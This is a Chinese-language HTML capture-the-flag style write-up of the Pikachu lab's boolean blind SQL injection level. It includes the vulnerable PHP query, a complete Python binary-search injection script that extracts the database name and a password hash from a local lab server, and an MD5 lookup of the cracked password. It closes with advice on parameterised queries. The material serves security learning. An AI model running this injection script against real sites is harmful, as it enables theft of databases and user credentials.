@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Pikachu】Web-SQL-Inject 盲注(base on boolean) Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .code-block { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow-x: auto; }
+        .code-comment { color: #6a737d; }
+        .code-keyword { color: #d73a49; }
+        .code-string { color: #032f62; }
+        .code-function { color: #6f42c1; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Pikachu】Web-SQL-Inject 盲注(base on boolean) Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.28 | <strong>分类：</strong>Pikachu | <strong>标签：</strong>Pikachu, Web, SQL注入, 布尔盲注, Python, 二分查找, 编码陷阱</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Pikachu 漏洞练习平台</li>
+        <li><strong>分类：</strong>Web - SQL-Inject</li>
+        <li><strong>题目名称：</strong>盲注(base on boolean)</li>
+        <li><strong>目标：</strong>在页面无数据回显、无报错信息的条件下，利用布尔逻辑判断，结合 Python 二分查找算法，自动化提取数据库名与管理员密码哈希。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>漏洞原理：</strong></p>
+    <p>布尔盲注是 SQL 注入的一种高级形式。该关卡的后端代码通过 `mysqli_num_rows($result)` 判断查询结果的行数，仅在页面回显“存在”或“不存在”两种状态。攻击者无法直接通过页面获取数据，但可以通过构造逻辑判断语句（如 `and 1=1`、`and 1=2`），利用页面的状态差异来推断数据库中的信息。为了提高效率，通常使用二分查找算法逐字猜解目标数据。</p>
+    
+    <div class="diff-box">
+        <strong>工具选型与心路历程：</strong>
+        <ul>
+            <li><strong>源码分析：</strong>通过查看 `sqli_blind_b.php` 源码，发现查询逻辑为 <code>select id,email from member where username='$name'</code>，且包含致命限制：<code>mysqli_num_rows($result)==1</code>。这意味着查询结果必须<strong>严格等于1行</strong>，否则页面会显示“不存在”。</li>
+            <li><strong>目标用户选择：</strong>由于 `vince` 在之前关卡中被多次篡改，导致其数据重复。使用 Python 查询 `member` 表，选取了唯一存在的用户 `allen` 进行测试。</li>
+            <li><strong>编码陷阱：</strong>在编写 Python 脚本时，遭遇了极其隐蔽的 URL 编码陷阱，导致长达数小时的排错。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：源码审计与关键信息提取</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 使用 VS Code 打开 `sqli_blind_b.php` 源码。</p>
+        <div class="payload-box">
+            <p><strong>核心代码片段：</strong></p>
+        </div>
+<pre class="code-block"><code><span class="code-comment">// 1. 接收参数，未做任何过滤</span>
+$name = $_GET['name'];
+<span class="code-comment">// 2. 直接拼接 SQL，查询 member 表</span>
+$query = <span class="code-string">"select id,email from member where username='$name'"</span>;
+$result = mysqli_query($link, $query);
+<span class="code-comment">// 3. 致命限制：结果必须严格等于 1 行</span>
+<span class="code-keyword">if</span> ($result && mysqli_num_rows($result)==1) {
+    <span class="code-comment">// 回显数据</span>
+} <span class="code-keyword">else</span> {
+    echo <span class="code-string">"您输入的username不存在，请重新输入！"</span>;
+}</code></pre>
+        <p class="info-line"><span class="info-label">代码解析：</span> 源码揭示了两个关键信息：<strong>查询表为 `member`</strong>，<strong>查询条件必须是 `username='$name'`</strong>。最关键的是 `mysqli_num_rows($result)==1` 这个限制，如果使用 `1=1` 导致查出多行，页面依然会报错，这就强制我们必须在 Payload 中使用 `and` 逻辑，并基于一个真实存在的用户名。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：寻找真实可用的用户名</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 编写 `check_member.py` 查询数据库。</p>
+        <div class="payload-box">
+            <p><strong>代码：</strong></p>
+        </div>
+<pre class="code-block"><code><span class="code-keyword">import</span> pymysql
+db = pymysql.connect(host=<span class="code-string">'127.0.0.1'</span>, user=<span class="code-string">'root'</span>, password=<span class="code-string">'root'</span>, database=<span class="code-string">'pikachu'</span>, charset=<span class="code-string">'utf8'</span>)
+cursor = db.cursor()
+cursor.execute(<span class="code-string">"SELECT username FROM member"</span>)
+<span class="code-keyword">for</span> row <span class="code-keyword">in</span> cursor.fetchall():
+    print(row[0])
+db.close()</code></pre>
+        <p class="info-line"><span class="info-label">回显结果：</span> 数据库中存在 `vince`, `allen`, `kobe`, `grady`, `kevin`, `lucy`, `lili`。由于 `vince` 被多次修改可能存在重复，我们选取唯一的 `allen` 作为攻击锚点。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：自动化盲注脚本编写（含二分查找）</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 新建 `sqli_blind.py`，运行完整脚本。</p>
+        <div class="payload-box">
+            <p><strong>完整代码：</strong></p>
+        </div>
+<pre class="code-block"><code><span class="code-keyword">import</span> requests
+
+url = <span class="code-string">"http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php"</span>
+real_username = <span class="code-string">"allen"</span>  <span class="code-comment"># 使用真实存在的用户名</span>
+
+<span class="code-keyword">def</span> check_condition(condition):
+    <span class="code-comment"># 【核心修正】将 --+ 改为 -- （带空格），利用 requests 自动编码为 --%20</span>
+    payload = f<span class="code-string">"{real_username}' and {condition}-- "</span>
+    params = {<span class="code-string">"name"</span>: payload, <span class="code-string">"submit"</span>: <span class="code-string">"查询"</span>}
+    r = requests.get(url, params=params)
+    <span class="code-keyword">return</span> <span class="code-string">"your uid:"</span> <span class="code-keyword">in</span> r.text
+
+<span class="code-keyword">def</span> get_length(sql_query):
+    <span class="code-keyword">for</span> length <span class="code-keyword">in</span> range(1, 50):
+        <span class="code-keyword">if</span> check_condition(f<span class="code-string">"length(({sql_query}))={length}"</span>):
+            <span class="code-keyword">return</span> length
+    <span class="code-keyword">return</span> 0
+
+<span class="code-keyword">def</span> get_data(sql_query):
+    length = get_length(sql_query)
+    <span class="code-keyword">if</span> length == 0: <span class="code-keyword">return</span> <span class="code-string">""</span>
+    result = <span class="code-string">""</span>
+    <span class="code-keyword">for</span> pos <span class="code-keyword">in</span> range(1, length + 1):
+        low, high = 32, 126
+        <span class="code-keyword">while</span> low &lt; high:
+            mid = (low + high) // 2
+            <span class="code-keyword">if</span> check_condition(f<span class="code-string">"ascii(substr(({sql_query}),{pos},1))>{mid}"</span>):
+                low = mid + 1
+            <span class="code-keyword">else</span>:
+                high = mid
+        result += chr(low)
+        print(f<span class="code-string">"[*] 正在猜解: {result}"</span>)
+    <span class="code-keyword">return</span> result
+
+<span class="code-keyword">if</span> __name__ == <span class="code-string">"__main__"</span>:
+    print(<span class="code-string">"[*] 开始提取数据库名..."</span>)
+    db_name = get_data(<span class="code-string">"select database()"</span>)
+    print(f<span class="code-string">"[+] 成功提取到数据库名: {db_name}"</span>)
+
+    print(<span class="code-string">"\n[*] 开始提取第一个用户的密码..."</span>)
+    pw_hash = get_data(<span class="code-string">"select pw from member limit 0,1"</span>)
+    print(f<span class="code-string">"[+] 成功提取到密码哈希: {pw_hash}"</span>)</code></pre>
+        <p class="info-line"><span class="info-label">代码解析：</span></p>
+        <ul>
+            <li><code>check_condition</code>：发送带有逻辑判断的 Payload。如果页面包含 <code>your uid:</code>，说明判断条件为真。</li>
+            <li><code>get_length</code>：先猜解目标数据的长度（如数据库名长度为 7）。</li>
+            <li><code>get_data</code>：<strong>二分查找核心逻辑</strong>。ASCII 码范围在 32-126 之间。每次取中间值 `mid`，询问数据库“字符的 ASCII 码是否大于 mid”。如果为真，说明目标在右半区，将 `low = mid + 1`；否则在左半区，将 `high = mid`。最多 7 次请求即可精准定位一个字符。</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：执行结果与 MD5 解密</h3>
+        <p class="info-line"><span class="info-label">回显结果：</span></p>
+        <ul>
+            <li>数据库名：<code>[+] 成功提取到数据库名: pikachu</code></li>
+            <li>密码哈希：<code>[+] 成功提取到密码哈希: e10adc3949ba59abbe56e057f20f883e</code></li>
+        </ul>
+        <p class="info-line"><span class="info-label">解密验证：</span> 将提取到的哈希 <code>e10adc3949ba59abbe56e057f20f883e</code> 放入 cmd5.com 进行查询，结果显示明文密码为 <code>123456</code>。</p>
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：源码限制导致查询结果异常。</strong> 源码中存在 <code>mysqli_num_rows($result)==1</code>，这意味着如果使用 <code>or 1=1</code> 会导致结果集超过 1 行，页面依然报“不存在”。解决方案是必须使用真实存在的唯一用户名（如 allen），并在 Payload 中用 <code>and</code> 连接逻辑。</li>
+        <li><strong>坑2：Python requests 的 URL 编码陷阱（致命）。</strong> 在构造 URL 参数时，Python 的 <code>requests</code> 库会将 <code>+</code> 编码为 <code>%2B</code>，而 MySQL 的注释符 <code>--</code> 后必须跟空格才能生效。这导致 SQL 语法错误，页面始终返回“不存在”。解决方案是将 Payload 末尾的 <code>--+</code> 改为 <code>-- </code>（带空格），此时 <code>requests</code> 会将其正确编码为 <code>--%20</code>，MySQL 即可正确注释尾部。</li>
+        <li><strong>坑3：盲注效率问题。</strong> 人工手动逐个字符测试效率极低。使用 Python 脚本配合二分查找算法，将每个字符的猜测次数从最多 95 次（遍历 ASCII）降低到最多 7 次，极大提升了自动化效率。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>布尔盲注核心：</strong> 在无回显、无报错的场景下，利用逻辑判断（<code>and</code> / <code>or</code>）和页面状态的差异来推断数据。</li>
+        <li><strong>二分查找算法：</strong> 在盲注中，通过 <code>ascii(substr(...)) > mid</code> 的方式快速缩小 ASCII 范围，是编写高效盲注脚本的必备技能。</li>
+        <li><strong>防御建议：</strong> 严格使用预编译语句（Prepared Statements）或参数化查询，确保参数与 SQL 语句代码分离；避免使用动态拼接字符串的方式执行 SQL。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
